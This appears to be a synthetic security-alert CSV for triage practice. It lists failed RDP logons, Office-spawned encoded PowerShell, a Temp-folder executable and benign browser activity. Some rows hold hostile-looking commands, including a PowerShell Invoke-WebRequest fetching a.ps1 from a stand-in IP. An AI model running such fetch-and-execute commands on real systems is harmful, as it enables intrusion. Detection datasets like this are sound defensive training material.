alert_id,timestamp,host,user,event_type,process_name,parent_process,command_line,src_ip,dest_ip,status,raw_message
1,2026-04-09T09:00:00Z,WIN10-01,jlocke,process_create,powershell.exe,winword.exe,powershell.exe -enc SQBtAG0AYQBsAGkAYwBpAG8AdQBzAA==,10.0.0.25,185.199.111.153,success,PowerShell launched from Word with encoded command
2,2026-04-09T09:05:00Z,WIN10-01,jlocke,logon_failed,lsass.exe,winlogon.exe,Failed RDP logon,203.0.113.50,10.0.0.25,failed,Multiple failed login attempts detected
3,2026-04-09T09:06:00Z,WIN10-01,jlocke,logon_failed,lsass.exe,winlogon.exe,Failed RDP logon,203.0.113.50,10.0.0.25,failed,Multiple failed login attempts detected
4,2026-04-09T09:07:00Z,WIN10-01,jlocke,logon_failed,lsass.exe,winlogon.exe,Failed RDP logon,203.0.113.50,10.0.0.25,failed,Multiple failed login attempts detected
5,2026-04-09T09:08:00Z,WIN10-01,jlocke,logon_failed,lsass.exe,winlogon.exe,Failed RDP logon,203.0.113.50,10.0.0.25,failed,Multiple failed login attempts detected
6,2026-04-09T09:09:00Z,WIN10-01,jlocke,logon_failed,lsass.exe,winlogon.exe,Failed RDP logon,203.0.113.50,10.0.0.25,failed,Multiple failed login attempts detected
7,2026-04-09T09:15:00Z,WIN10-02,analyst1,process_create,updater.exe,explorer.exe,C:\Users\analyst1\AppData\Local\Temp\updater.exe,10.0.0.30,198.51.100.22,success,Executable launched from temp directory
8,2026-04-09T09:20:00Z,WIN10-02,analyst1,network_connection,powershell.exe,cmd.exe,powershell.exe Invoke-WebRequest http://198.51.100.22/a.ps1,10.0.0.30,198.51.100.22,success,PowerShell made outbound network connection
9,2026-04-09T09:30:00Z,WIN10-03,student,process_create,chrome.exe,explorer.exe,chrome.exe https://albany.edu,10.0.0.40,104.18.40.10,success,Normal browser activity
10,2026-04-09T09:32:00Z,WIN10-03,student,process_create,powershell.exe,explorer.exe,powershell.exe Get-Process,10.0.0.40,10.0.0.1,success,Benign PowerShell usage
